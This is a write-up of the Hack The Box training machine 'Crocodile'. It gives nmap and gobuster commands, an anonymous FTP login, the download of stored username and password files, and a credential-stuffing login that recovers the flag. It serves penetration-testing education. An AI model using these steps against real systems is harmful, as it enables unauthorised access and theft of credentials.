# HTB Machine: Crocodile

* **OS:** Linux
* **Difficulty:** Very Easy (Tier 0)
* **Date Started:** July 2026
* **Target IP:** `10.129.1.15`

---

## Step-by-Step Walkthrough

### Step 1: Reconnaissance & Scanning
Run an initial `nmap` scan to discover open ports and determine the versions of running services:

```bash
sudo nmap -sV -sC 10.129.1.15
```

**Key Findings:**
* **Port 21 (FTP):** Open and active. *(Note: Port 21 is the standard port for FTP)*
* **Port 80 (HTTP):** Open, web server hosting a web application.

---

### Step 2: FTP Exploitation
Attempting a standard CLI login returned a specific restriction message:
```text
530 This FTP server is anonymous only.
```

Log in using the `anonymous` username with a blank password to successfully bypass the authentication check:

```bash
ftp 10.129.1.15
# Username: anonymous
# Password: <Press Enter>
```

---

### Step 3: Data Exfiltration
Inside the FTP server, two interesting credential files were located. Use the `get` command to download them locally:

```text
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
```

Reading the contents of the downloaded files revealed four potential usernames and four potential passwords:

**Usernames (`allowed.userlist`):**
* `aron`
* `pwnmeow`
* `egotisticalsw`
* `admin`

**Passwords (`allowed.userlist.passwd`):**
* `root`
* `Supersecretpassword1`
* `@BaASD&9032123sADS`
* `rKXM59ESxesUFHAd`

---

### Step 4: Web Directory Brute-Forcing
Perform directory busting using `gobuster` on the HTTP service to find hidden paths and login portals:

```bash
gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt
```

**Key Finding:**
* Found the `/dashboard` directory, which hosts the main administrative login portal.

---

### Step 5: Credential Stuffing & Flag Retrieval
Navigate to the web login page discovered via directory busting. Manually test the exfiltrated usernames against the discovered passwords. 

By testing the `admin` user against the password list, a successful login was achieved, granting access to the system dashboard where the flag was recovered.

* **Valid Username:** `admin`
* **Valid Password:** `rKXM59ESxesUFHAd`
